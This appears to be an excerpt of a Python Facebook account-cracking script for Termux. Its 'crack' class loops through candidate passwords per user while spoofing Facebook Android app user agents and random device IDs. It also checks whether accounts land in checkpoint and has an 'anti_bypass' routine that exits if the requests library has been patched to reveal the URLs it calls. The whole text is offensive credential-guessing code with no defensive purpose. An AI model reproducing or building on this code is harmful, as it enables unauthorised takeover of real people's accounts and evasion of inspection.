...
class crack:
    ...
    def __free__(self,user,__juts__,_jat):
        ...
        for pw in __juts__:
            try:
                ...
                ua_string = f'[FBAN/FB4A;FBAV/261.0.0.52.126;FBBV/202681550;FBDM/'+'{density=2.0,width=720,height=1280};FBLC/en_GB;FBRV/0;FBCR/airtel;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                data = {
                    'locale':'en-GB',
    ...
    def __mmb__(self,user,__juts__,_jat):
        ...
        for pw in __juts__:
            try:
                ...
                ua_string = f'[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027753;FBDM/'+'{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/209644275;FBCR/Jio 4G;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
                device = str(uuid.uuid4())
                adid = str(uuid.uuid4())
                data = {
                    'adid':adid,
    ...
    def cek_cp(self,user,pw):
        ...
        session.headers.update({'Host': 'mbasic.facebook.com', 
           ...
           'user-agent': 'Mozilla/5.0 (Linux; Android 10; V2024; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.10.0.0'})
...
def anti_bypass():
      f1=open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py','r',).read()
      if "print(url)" in f1:
             print("BYPASS PA")
             exit()
      else:
